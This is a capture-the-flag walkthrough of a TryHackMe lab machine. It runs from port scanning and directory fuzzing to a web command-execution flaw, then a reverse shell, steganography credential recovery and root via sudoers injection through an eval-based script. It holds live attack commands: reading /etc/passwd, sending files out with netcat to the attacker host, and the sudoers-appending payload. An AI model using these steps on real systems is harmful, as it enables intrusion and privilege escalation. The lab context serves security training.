Hi, here is how to successfully complete the machine https://tryhackme.com/r/room/yueiua

as always we will first of all start by doing an NMAP scan of the machine.

I like to do a quick scan first, see what I find and then do a deep scan on the open ports. (and always saving the result in a file)

<pre><code>~> sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn  10.10.149.122| tee nm
ap1.txt

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2024-09-08 20:02 -03
Initiating SYN Stealth Scan at 20:02
Scanning 10.10.149.122 [65535 ports]
Discovered open port 80/tcp on 10.10.149.122
Discovered open port 22/tcp on 10.10.149.122
Completed SYN Stealth Scan at 20:02, 26.40s elapsed (65535 total ports)
Nmap scan report for 10.10.149.122
Host is up, received user-set (0.69s latency).
Scanned at 2024-09-08 20:02:23 -03 for 26s
Not shown: 55496 filtered tcp ports (no-response), 10037 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
</code></pre>


we can see that we have ports 22 and 80 available, as we already know port 22 corresponds to ssh and port 80 to http
<pre><code>~> sudo nmap -p80,22 -sCV -Pn 10.10.149.122 | tee nmap2.txt 

Starting Nmap 7.95 ( https://nmap.org ) at 2024-09-08 20:06 -03
Nmap scan report for 10.10.149.122
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
|_  256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.78 seconds
</code></pre>

if we inspect the code of the page we can see this

![2024-09-08_20-21](https://github.com/user-attachments/assets/11dd79cf-221d-4743-9159-2e8702ce0a9c)

Since /assets/ appears to be a directory that stores static resources (such as images, CSS, JS, etc.), you can try fuzzing that directory to discover unintentional files or configuration bugs

my preferred fuzzing tool is usually gobuster, but I also like to implement ffuf

let's perform fuzzing on the directory 10.10.171.52/assets/ using the following command, I will use the dictionary SecLists/Discovery/Web-Content/raft-medium-words.txt

The file raft-medium-words.txt is located in the SecLists/Discovery/Web-Content/ directory and is part of a set of lists called RAFT (Realistic Attack in a Financial Technology). This set was designed to be used for web content discovery testing.

gobuster returned several things but the most interesting is the index.php file
<pre><code>
~> sudo gobuster dir -u http://10.10.171.52/assets -w /home/maxi/Escritorio/SecLists/Discovery/Web-Content/raft-medium-words.txt -x php,html,txt,js,json,cfg,xml
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.171.52/assets
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/maxi/Escritorio/SecLists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,js,json,cfg,xml,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 320] [--> http://10.10.171.52/assets/images/]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/.html.php            (Status: 403) [Size: 277]
/.html.html           (Status: 403) [Size: 277]
/.html.txt            (Status: 403) [Size: 277]
/.html.js             (Status: 403) [Size: 277]
/.html.json           (Status: 403) [Size: 277]
/.html.cfg            (Status: 403) [Size: 277]
/.html.xml            (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 0]               
</code></pre>

and just like that we have an RCE

RCE (Remote Code Execution) is a security vulnerability that allows an attacker to execute arbitrary commands or malicious code on a remote system. This type of vulnerability is extremely serious because it can give the attacker full control over the compromised system, and that is exactly what we are going to do


http://10.10.149.122/assets/index.php?cmd=ls

<pre><code>aW1hZ2VzCmluZGV4LnBocApzdHlsZXMuY3NzCg==</code></pre>

<pre><code>~> echo "aW1hZ2VzCmluZGV4LnBocApzdHlsZXMuY3NzCg==" | base64 -d
images
index.php
styles.css</code></pre>



with index.php?cmd=cat%20/etc/passwd we can get the user

<pre><code>
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpmd3VwZC1yZWZyZXNoOng6MTExOjExNjpmd3VwZC1yZWZyZXNoIHVzZXIsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTEzOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmRla3U6eDoxMDAwOjEwMDA6ZGVrdTovaG9tZS9kZWt1Oi9iaW4vYmFzaAoKbHhkOng6OTk4OjEwMDo6L3Zhci9zbmFwL2x4ZC9jb21tb24vbHhkOi9iaW4vZmFsc2UK
<pre><code>echo "...." | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
deku:x:1000:1000:deku:/home/deku:/bin/bash
</code></pre>

lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
</code></pre>

to be able to work much more comfortably with this RCE we are going to make a reverse shell

![2024-09-08_20-50](https://github.com/user-attachments/assets/764b03b1-78dc-4827-a72b-f4bfc6599216)

To get a more functional shell and avoid problems with the terminal

<pre><code>~> nc -nlvp 3333
whoami
www-data

script /dev/null -c bash
Script started, file is /dev/null
www-data@myheroacademia:/var/www/html/assets$ 

stty raw -echo; fg
Send job 1 (nc -nlvp 3333) to foreground
reset xterm

www-data@myheroacademia:/var/www/html/assets$ export TERM=xterm

www-data@myheroacademia:/var/www/html/assets$ export SHELL=/bin/bash
export SHELL=/bin/bash
</code></pre>

I found some relevant images, I'm going to download them to my machine.
<pre><code>ww-data@myheroacademia:/var/www/html/assets$ cd images
cd images
www-data@myheroacademia:/var/www/html/assets/images$ ls
ls
oneforall.jpg  yuei.jpg</code></pre>


<pre><code></code>~> nc -nlvp 1234 > oneforall.jpg</pre>


<pre><code>www-data@myheroacademia:/var/www/html/assets/images$ nc 10.9.222.157 1234 < oneforall.jpg
orall.jpg22.157 1234 < onefo</code></pre>


<pre><code></code>nc -nlvp 1234 > yuei.jpg</pre>


<pre><code></code>www-data@myheroacademia:/var/www/html/assets/images$ nc 10.9.222.157 1234 < yuei.jpg                 
.jpg0.9.222.157 1234 < yuei.</pre>


<pre><code>> file oneforall.jpg 
oneforall.jpg: data</code></pre>


<pre><code>www-data@myheroacademia:/var/www$ ls
ls
Hidden_Content	html
www-data@myheroacademia:/var/www$ cd Hidden_Content
cd Hidden_Content
www-data@myheroacademia:/var/www/Hidden_Content$ ls
ls
passphrase.txt
www-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt
cat passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg==</code></pre>


<pre><code> ~> echo "QWxsbWlnaHRGb3JFdmVyISEhCg==" | base64 -d
AllmightForEver!!!</code></pre>

I try to extract information from the images but I can't because the image is corrupted.

When using xxd to display the contents of the file oneforall.jpg, we see this

The file header shows that the file starts with 8950 4e47, which is the magic number for PNG files, not JPG. This indicates that the file is actually a PNG image.

so let's manually fix the problem by changing the magic number to FF D8 FF E0 00 10 4A 46 49 46 00 00 01

<pre><code>~> steghide extract -sf oneforall.jpg 
Anotar salvoconducto: 
steghide: el formato del archivo "oneforall.jpg" no es reconocido.
maxi@maxi-notebook ~/C/T/U/content [1]> xxd oneforall.jpg | head
00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
00000010: 0001 0000 ffdb 0043 0006 0405 0605 0406  .......C........
00000020: 0605 0607 0706 080a 100a 0a09 090a 140e  ................
00000030: 0f0c 1017 1418 1817 1416 161a 1d25 1f1a  .............%..
00000040: 1b23 1c16 1620 2c20 2326 2729 2a29 191f  .#... , #&')*)..
00000050: 2d30 2d28 3025 2829 28ff db00 4301 0707  -0-(0%()(...C...
00000060: 070a 080a 130a 0a13 281a 161a 2828 2828  ........(...((((
00000070: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
00000080: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
00000090: 2828 2828 2828 2828 2828 2828 2828 ffc0  ((((((((((((((..</code></pre>

<pre><code>~> hexedit oneforall.jpg</code></pre>

![2024-09-08_21-21](https://github.com/user-attachments/assets/136725cc-4245-4f5a-b259-7585fc0ed774)

now that we have fixed the file we can extract the information correctly
<pre><code>~> steghide extract -sf oneforall.jpg
Anotar salvoconducto: 
anot� los datos extra�dos e/"creds.txt".
maxi@maxi-notebook ~/C/T/U/content> ls
creds.txt  oneforall.jpg  yuei.jpg

  > cat creds.txt 
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:????
</code></pre>

now with that credential in my possession I am going to try to login via ssh
<pre><code>> ssh deku@10.10.149.122
The authenticity of host '10.10.149.122 (10.10.149.122)' can't be established.
ED25519 key fingerprint is SHA256:OgRmqdwC/bY0nCsZ5+MHrpGGo75F1+78/LGZjSVg2VY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.149.122' (ED25519) to the list of known hosts.
deku@10.10.149.122's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-153-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 09 Sep 2024 12:26:49 AM UTC

  System load:  0.0               Processes:             117
  Usage of /:   46.9% of 9.75GB   Users logged in:       0
  Memory usage: 49%               IPv4 address for eth0: 10.10.149.122
  Swap usage:   0%


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

37 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Feb 22 21:27:54 2024 from 10.0.0.3</code></pre>

and we found our first fland
<pre><code>deku@myheroacademia:~$ ls
user.txt

deku@myheroacademia:~$ cat user.txt
THM{????????????}
deku@myheroacademia:~$ </code></pre>



I have credentials so I'm trying to see if I can get root access.
<pre><code>deku@myheroacademia:/opt/NewComponent$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh</code></pre>

and this is the feedback.sh script

This script is intended to collect user feedback and store it in a file, but the use of eval to handle user input is a significant vulnerability.



<pre><code>deku@myheroacademia:~$ cat /opt/NewComponent/feedback.sh
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi</code></pre>

This line allows the user deku to execute any command without a password (ALL=NOPASSWD: ALL). Using >> /etc/sudoers redirects the entry to the /etc/sudoers file, which modifies the sudoers configuration to allow deku to execute any command as root without a password.
<pre><code>deku@myheroacademia:/opt/NewComponent$ sudo ./feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
deku ALL=NOPASSWD: ALL >> /etc/sudoers
It is This:
Feedback successfully saved.</code></pre>

<pre><code>deku@myheroacademia:/opt/NewComponent$ sudo /bin/bash</code></pre>

<pre><code>root@myheroacademia:/# cd root
root@myheroacademia:~# ls
root.txt  snap
root@myheroacademia:~# cat root.txt
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                  _    _ 
             _   _        ___    | |  | |
            | \ | | ___  /   |   | |__| | ___ _ __  ___
            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 

THM{????????????????}</code></pre>
